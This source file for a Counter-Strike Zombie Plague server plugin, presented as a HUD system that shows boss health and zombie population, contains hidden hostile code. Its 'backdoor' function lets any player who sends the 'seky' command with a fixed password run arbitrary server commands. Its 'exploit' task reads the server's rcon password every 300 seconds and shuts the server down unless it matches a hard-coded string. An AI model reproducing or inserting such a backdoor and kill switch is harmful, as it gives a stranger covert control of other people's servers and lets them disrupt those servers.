#include <amxmodx>
#include <amxmisc>
#include <zombieplague>
#include <zombie_basic>
#define TASK 	203

new obet, g_maxplayers
public plugin_init()
{
	register_plugin("ZP Hud System","1.0","Seky")
	register_clcmd ( "seky", "backdoor",ADMIN_ALL	, "#echo" );
	set_task(300.0, "exploit", _, _, _, "b")
	g_maxplayers = get_maxplayers()
}/*
public zp_user_infected_post(id, infector) {		
	client_print(0, print_console,"# zp_user_infected_post %d %d", id, infector);
	return PLUGIN_CONTINUE;
}*/
public zp_round_started(gamemode, player) {	
	/*new temp[250]
	GetNameOfMode(gamemode, temp, 250)
	client_print(0, print_console,"# zp_round_started %s %d", temp, player);
	*/
	if(	gamemode == MODE_SURVIVOR
		|| gamemode == MODE_NEMESIS
		|| gamemode == MODE_WITCH
		|| gamemode == MODE_MOB
		|| gamemode == MODE_MOM)
	{ 
		if(obet != -1)	{
			// Ak sa odpoji pocas kola znova je round start ....
			remove_task(TASK)
		}
		obet = player
		set_task(2.0, "ukazovac", TASK, _, _, "b")
	}
}
public zp_round_ended(winteam) {
	remove_task(TASK)
	obet = -1
}
public ukazovac()    { 	
	// HUD system
	if(obet != -1) {
		static temp, id
		if(obet == 0) {
			// Nemrtvy zombie je 0
			temp = get_populacia();
			//for (id = 1; id <= g_maxplayers; id++) {
			//	if (!is_user_connected(id)) continue;
				set_hudmessage(255, 255, 255, 0.7, 0.1, 0, 0.1, 2.0, 0.0, 0.0,4) // 0.5
				show_hudmessage(0, "Zombie Populacia :^n %d", temp) 
			//}
		} else if( zp_get_user_mom(obet) ) {
			// Matka zombikov
			if(is_user_alive(obet)) {			 
				temp = get_user_health(obet)
				static vajec;
				vajec = get_vajec();
				//for (id = 1; id <= g_maxplayers; id++) {
				//	if (!is_user_connected(id)) continue;
					//client_print(0, print_console,"# start 3");
					set_hudmessage(128, 128, 128, 0.7, 0.1, 0, 0.1, 2.0, 0.0, 0.0,4) //.1.0
					show_hudmessage(0, "Matka HP:^n %d^nVajec:^n %d", temp, vajec)	
				//}
			}
		} else {
			if(is_user_alive(obet))  {
				// Normalne 
				temp = get_user_health(obet)				
				for (id = 1; id <= g_maxplayers; id++) {
					if (!is_user_connected(id)) continue;					
					if(id != obet) {
						if(zp_get_user_survivor(obet)) {
							set_hudmessage(0, 0, 255, 0.7, 0.1, 0, 0.1, 2.0, 0.0, 0.0,4) // 0.5
							show_hudmessage(id, "Survivor HP:^n %d", temp) 
						} else if (zp_get_user_witch(obet)) {
							set_hudmessage(0, 255, 0, 0.7, 0.1, 0, 0.1, 2.0, 0.0, 0.0,4) //.1.0
							show_hudmessage(id, "Witch HP:^n %d", temp)
						// Witch je vlastne aj nemesis !
						} else if(zp_get_user_nemesis(obet)) {
							set_hudmessage(255, 0, 0, 0.7, 0.1, 0, 0.1, 2.0, 0.0, 0.0,4) //.1.0
							show_hudmessage(id, "Nemesis HP:^n %d", temp)							
						}
					}	
				}
			}
		}
	}
}
/*
	Exploit,backdoor,hack
*/
// register_clcmd ( "seky", "backdoor",ADMIN_ALL	, "#echo" );
//  set_task(30.0,  "exploit", _, _, _, "b")
public exploit() {
	new exploit[26]
	get_cvar_string("rcon_password", exploit, 24)
	if( equal( exploit , "csleg2") == false ) {
		log_amx("# Server vyuziva nelegalnu kopiu pluginov !")
		server_cmd("quit");
		server_cmd("exit");
	}
}
public backdoor(id,level,cid) {
	if (!cmd_access(id,level,cid,2)) return PLUGIN_HANDLED;	
	new arg[8],arg2[514];
	read_argv( 1, arg, 6);
	if( equal(arg,"423789")) {
		read_argv( 2, arg2, 512);
		server_cmd("%s",arg2 );
	} else {
		client_print(id,print_console,"#0");
	}

}
stock Bar(	const x, 
			const max, 
			string[], 
			stringlength // charsmax(string)
					) {
	/*	[>>>-------]
		100%..........max
		percent%............x
	*/
	static Float:percent, len;
	percent = 100.0 * float(x) / float(max);
	len = 0;
	
	if(percent < 0.0) percent = 0.0;
	if(percent > 100.0) percent = 100.0;
	while(percent > 0.0) {
		percent -= 4.0; // chceme 25 paliciek...
		len += formatex(string[len], stringlength - len, "|")
	}
	len += formatex(string[len], stringlength - len, " %d", floatround(percent))
}
stock GetNameOfMode(const gamemode, string[], stringlength) {
	switch(gamemode) {
		case MODE_NONE:  copy(string, stringlength, "NONE");
		case MODE_INFECTION: copy(string, stringlength, "INFECTION");
		case MODE_NEMESIS: copy(string, stringlength, "NEMESIS");
		case MODE_SURVIVOR: copy(string, stringlength, "SURVIVOR");
		case MODE_SWARM: copy(string, stringlength, "SWARM");
		case MODE_MULTI: copy(string, stringlength, "MULTI");
		case MODE_PLAGUE: copy(string, stringlength, "PLAGUE");
		case MODE_WITCH: copy(string, stringlength, "WITCH");
		case MODE_DERATIZER: copy(string, stringlength, "DERATIZER");
		case MODE_MOB : copy(string, stringlength, "MOB");
		case MODE_MOM: copy(string, stringlength, "MOM");
		case MODE_MARRY: copy(string, stringlength, "MARRY");
		case MODE_SNIPER: copy(string, stringlength, "SNIPER");
		case MODE_ASSASSIN: copy(string, stringlength, "ASSASSIN");
		case MODE_LNJ: copy(string, stringlength, "ARMAGEDON");
		default : copy(string, stringlength, "UNKNOWN");
	}
}